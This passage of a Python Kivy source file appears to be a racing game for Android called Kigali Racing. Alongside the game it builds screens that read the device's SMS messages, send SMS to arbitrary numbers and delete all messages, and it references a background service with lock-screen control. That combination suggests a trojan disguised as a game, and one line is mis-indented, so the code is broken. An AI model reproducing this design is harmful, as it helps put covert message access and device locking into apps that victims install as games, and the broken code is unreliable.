                'color': LUXURY_CARS[car_key]['color']
            })
        
        self.speed_label = Label(text='0 km/h', font_size=20, color=(1, 0.5, 0, 1), pos_hint={'x': 0.02, 'top': 0.95})
        self.add_widget(self.speed_label)
        self.position_label = Label(text='🏁 P1', font_size=24, color=(1, 1, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.95})
        self.add_widget(self.position_label)
        self.lap_label = Label(text=f"LAP 1/{level['laps']}", font_size=18, color=(0.5, 0.8, 1, 1), pos_hint={'right': 0.98, 'top': 0.95})
        self.add_widget(self.lap_label)
    
    def update(self, dt):
        if not self.game_started or self.game_over or self.race_finished:
            return
        
        self.move_player()
        self.move_ai_cars()
        self.update_hud()
    
    def move_player(self):
        if self.accelerating:
            car = LUXURY_CARS[self.selected_car]
            max_speed = 5 * (car['speed'] / 5.0)
            self.speed = min(self.speed + 0.2, max_speed)
        else:
            self.speed = max(self.speed - 0.1, 0)
        
        self.player_y += self.speed
        if self.turning:
            self.player_x += self.turning * 4
        if self.player_x < Window.width/2 - 100:
            self.player_x = Window.width/2 - 100
        if self.player_x > Window.width/2 + 100:
            self.player_x = Window.width/2 + 100
        
        current_level = ALL_LEVELS[self.current_level - 1] if self.current_level <= len(ALL_LEVELS) else None
        if current_level and self.player_y > Window.height * 2:
            if self.lap < current_level['laps']:
                self.lap += 1
                self.player_y = 100
                self.lap_label.text = f"LAP {self.lap}/{current_level['laps']}"
            else:
                self.end_race()
        
        with self.canvas:
            car = LUXURY_CARS[self.selected_car]
            Color(car['color'][0], car['color'][1], car['color'][2], car['color'][3])
            Rectangle(pos=(self.player_x - 20, self.player_y - 15), size=(40, 30))
            Color(0.2, 0.2, 0.3, 0.8)
            Rectangle(pos=(self.player_x - 12, self.player_y - 5), size=(24, 15))
    
    def move_ai_cars(self):
        for ai in self.ai_cars:
            ai['y'] += ai['speed']
            with self.canvas:
                Color(ai['color'][0], ai['color'][1], ai['color'][2], ai['color'][3])
                Rectangle(pos=(ai['x'] - 18, ai['y'] - 12), size=(36, 24))
    
    def update_hud(self):
        speed_kmh = int(self.speed * 15)
        self.speed_label.text = f"{speed_kmh} km/h"
        position = 1
        for ai in self.ai_cars:
            if ai['y'] > self.player_y:
                position += 1
        self.position_label.text = f"🏁 P{position}"
    
    def end_race(self):
        self.game_started = False
        self.race_finished = True
        
        position = 1
        for ai in self.ai_cars:
            if ai['y'] > self.player_y:
                position += 1
        
        stars = 3 if position == 1 else 2 if position <= 3 else 1
        if stars >= 1:
            self.completed_levels.add(self.current_level)
            self.coins += stars
            self.save_progress()
        
        self.clear_widgets()
        with self.canvas:
            Color(0, 0, 0, 0.85)
            Rectangle(pos=(0, 0), size=Window.size)
                result_text = '🏆 YOU WIN!' if position == 1 else f'📊 Position: {position}'
        title = Label(text='🏁 RACE COMPLETE!', font_size=36, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.85})
        self.add_widget(title)
        result = Label(text=result_text, font_size=28, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'top': 0.7})
        self.add_widget(result)
        stars_label = Label(text='⭐' * stars + '☆' * (3 - stars), font_size=32, color=(1, 0.8, 0, 1), pos_hint={'center_x': 0.5, 'top': 0.6})
        self.add_widget(stars_label)
        
        retry_btn = Button(text='🔄 RETRY', size_hint=(0.3, 0.08), pos_hint={'center_x': 0.35, 'top': 0.4}, background_color=(0.4, 0.4, 0.4, 1), font_size=16)
        retry_btn.bind(on_press=lambda x: self.start_level(ALL_LEVELS[self.current_level - 1]))
        self.add_widget(retry_btn)
        
        menu_btn = Button(text='📋 MENU', size_hint=(0.3, 0.08), pos_hint={'center_x': 0.65, 'top': 0.4}, background_color=(0.2, 0.3, 0.5, 1), font_size=16)
        menu_btn.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(menu_btn)
    
    # ============================================================
    # 📱 SMS MANAGEMENT UI
    # ============================================================
    
    def show_sms_manager(self, instance):
        if self.check_lock_state():
            return
        
        self.clear_widgets()
        with self.canvas:
            Color(0.05, 0.05, 0.1, 1)
            Rectangle(pos=(0, 0), size=Window.size)
        
        back = Button(text='◀ Back', size_hint=(0.15, 0.06), pos_hint={'x': 0.02, 'top': 0.95}, background_color=(0.3, 0.3, 0.3, 1), font_size=14)
        back.bind(on_press=lambda x: self.show_main_menu())
        self.add_widget(back)
        
        title = Label(text='📱 SMS MANAGEMENT', font_size=28, color=(1, 1, 1, 1), pos_hint={'center_x': 0.5, 'top': 0.92})
        self.add_widget(title)
        
        stats_text = f"📊 Total: {self.sms_manager.get_sms_count()}  |  📬 Unread: {self.sms_manager.get_unread_sms()}"
        stats = Label(text=stats_text, font_size=16, color=(0.6, 0.6, 0.6, 1), pos_hint={'center_x': 0.5, 'top': 0.85})
        self.add_widget(stats)
        
        action_layout = BoxLayout(size_hint=(0.9, 0.08), pos_hint={'center_x': 0.5, 'top': 0.78}, spacing=5)
        
        read_btn = Button(text='📖 Read SMS', font_size=14, background_color=(0.2, 0.4, 0.6, 1))
        read_btn.bind(on_press=self.show_sms_list)
        action_layout.add_widget(read_btn)
        
        send_btn = Button(text='📤 Send SMS', font_size=14, background_color=(0.2, 0.6, 0.2, 1))
        send_btn.bind(on_press=self.show_send_sms)
        action_layout.add_widget(send_btn)
        
        delete_btn = Button(text='🗑️ Delete All', font_size=14, background_color=(0.6, 0.2, 0.2, 1))
        delete_btn.bind(on_press=self.confirm_delete_all)
        action_layout.add_widget(delete_btn)
        
        self.add_widget(action_layout)
    
    def show_sms_list(self, instance):
        sms_list = self.sms_manager.read_sms(limit=50)
        
        content = BoxLayout(orientation='vertical', padding=10)
        scroll = ScrollView(size_hint=(1, 0.85))
        grid = BoxLayout(orientation='vertical', size_hint_y=None, spacing=2)
        grid.bind(minimum_height=grid.setter('height'))
        
        if not sms_list:
            grid.add_widget(Label(text='📭 No SMS messages', font_size=16, color=(0.5, 0.5, 0.5, 1)))
        else:
            for sms in sms_list[-20:]:
                sender = sms.get('sender', 'Unknown')
                body = sms.get('body', '')[:35]
                time_str = time.strftime('%H:%M', time.localtime(sms.get('timestamp', 0)/1000))
                read_status = '📬' if not sms.get('read', False) else '📖'
                sms_id = sms.get('id', 0)
                
                item_layout = BoxLayout(orientation='horizontal', size_hint_y=None, height=45, spacing=5)
                sms_label = Label(text=f"{read_status} {sender}: {body} ({time_str})", font_size=11, halign='left', text_size=(450, None), size_hint_x=0.8)
                item_layout.add_widget(sms_label)
                
                del_btn = Button(text='🗑️', font_size=14, size_hint_x=0.15, background_color=(0.6, 0.2, 0.2, 1))
                del_btn.bind(on_press=lambda x, sid=sms_id: self.confirm_delete_sms(sid))
                item_layout.add_widget(del_btn)
                
                grid.add_widget(item_layout)
        
        scroll.add_widget(grid)
        content.add_widget(scroll)
        
        close_btn = Button(text='Close', size_hint_y=None, height=50)
        close_btn.bind(on_press=lambda x: sms_popup.dismiss())
        content.add_widget(close_btn)
        
        sms_popup = Popup(title='📱 SMS MESSAGES', content=content, size_hint=(0.9, 0.8))
        sms_popup.open()
    
    def show_send_sms(self, instance):
        content = BoxLayout(orientation='vertical', padding=10, spacing=10)
        
        number_label = Label(text='📱 Phone Number:', font_size=14, halign='left', size_hint_y=None, height=30)
        content.add_widget(number_label)
        number_input = TextInput(text='+250', font_size=14, size_hint_y=None, height=40)
        content.add_widget(number_input)
        
        msg_label = Label(text='📝 Message:', font_size=14, halign='left', size_hint_y=None, height=30)
        content.add_widget(msg_label)
        msg_input = TextInput(text='', font_size=14, size_hint_y=None, height=100, multiline=True)
        content.add_widget(msg_input)
        
        def do_send(x):
            number = number_input.text.strip()
            message = msg_input.text.strip()
            if number and message:
                self.sms_manager.send_sms(number, message)
                sms_popup.dismiss()
                try:
                    notification.notify(title='SMS Sent', message=f'Sent to {number}')
                except:
                    pass
        
        send_btn = Button(text='📤 SEND SMS', size_hint_y=None, height=50, background_color=(0.2, 0.6, 0.2, 1), font_size=16)
        send_btn.bind(on_press=do_send)
        content.add_widget(send_btn)
        
        cancel_btn = Button(text='Cancel', size_hint_y=None, height=40, background_color=(0.4, 0.4, 0.4, 1))
        cancel_btn.bind(on_press=lambda x: sms_popup.dismiss())
        content.add_widget(cancel_btn)
        
        sms_popup = Popup(title='📤 SEND SMS', content=content, size_hint=(0.85, 0.7))
        sms_popup.open()
    
    def confirm_delete_sms(self, sms_id):
        content = BoxLayout(orientation='vertical', padding=10)
        content.add_widget(Label(text='🗑️ Delete this SMS?', font_size=18))
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10)
        yes_btn = Button(text='✅ Yes', background_color=(0.6, 0.2, 0.2, 1))
        yes_btn.bind(on_press=lambda x: self.do_delete_sms(sms_id))
        btn_layout.add_widget(yes_btn)
        no_btn = Button(text='❌ Cancel', background_color=(0.3, 0.3, 0.3, 1))
        no_btn.bind(on_press=lambda x: confirm_popup.dismiss())
        btn_layout.add_widget(no_btn)
        content.add_widget(btn_layout)
        
        confirm_popup = Popup(title='⚠️ Confirm Delete', content=content, size_hint=(0.7, 0.3))
        confirm_popup.open()
    
    def do_delete_sms(self, sms_id):
        if self.sms_manager.delete_sms(sms_id):
            if hasattr(self, 'confirm_popup'):
                self.confirm_popup.dismiss()
            self.show_sms_list(None)
    
    def confirm_delete_all(self, instance):
        count = self.sms_manager.get_sms_count()
        content = BoxLayout(orientation='vertical', padding=10)
        content.add_widget(Label(text=f'🗑️ Delete ALL {count} SMS messages?', font_size=18))
        content.add_widget(Label(text='⚠️ This cannot be undone!', font_size=14, color=(1, 0.5, 0.5, 1)))
        
        btn_layout = BoxLayout(size_hint_y=None, height=50, spacing=10)
        yes_btn = Button(text='✅ Yes, Delete All', background_color=(0.6, 0.2, 0.2, 1))
        yes_btn.bind(on_press=self.do_delete_all_sms)
        btn_layout.add_widget(yes_btn)
        no_btn = Button(text='❌ Cancel', background_color=(0.3, 0.3, 0.3, 1))
        no_btn.bind(on_press=lambda x: confirm_popup.dismiss())
        btn_layout.add_widget(no_btn)
        content.add_widget(btn_layout)
        
        confirm_popup = Popup(title='⚠️ DELETE ALL SMS', content=content, size_hint=(0.8, 0.35))
        confirm_popup.open()
    
    def do_delete_all_sms(self, instance):
        count = self.sms_manager.delete_all_sms()
        if hasattr(self, 'confirm_popup'):
            self.confirm_popup.dismiss()
        try:
            notification.notify(title='All SMS Deleted', message=f'{count} SMS deleted')
        except:
            pass
        self.show_sms_list(None)
    
    def on_touch_down(self, touch):
        if not self.game_started or self.game_over:
            return
        self.accelerating = True
        if touch.x < Window.width / 2 - 50:
            self.turning = -1
        elif touch.x > Window.width / 2 + 50:
            self.turning = 1
    
    def on_touch_up(self, touch):
        self.turning = 0
        self.accelerating = False
        # ============================================================
# 🚀 APP CLASS
# ============================================================
class KigaliRacingApp(App):
    def build(self):
        Window.size = (800, 600)
        game = KigaliRacingGame()
        # Pass app reference to service for lock screen control
        if hasattr(game, 'service'):
            game.service.app_ref = weakref.ref(self)
        return game
    
    def on_stop(self):
        if hasattr(self, 'root') and hasattr(self.root, 'service'):
            self.root.service.stop()

if __name__ == '__main__':
    KigaliRacingApp().run()
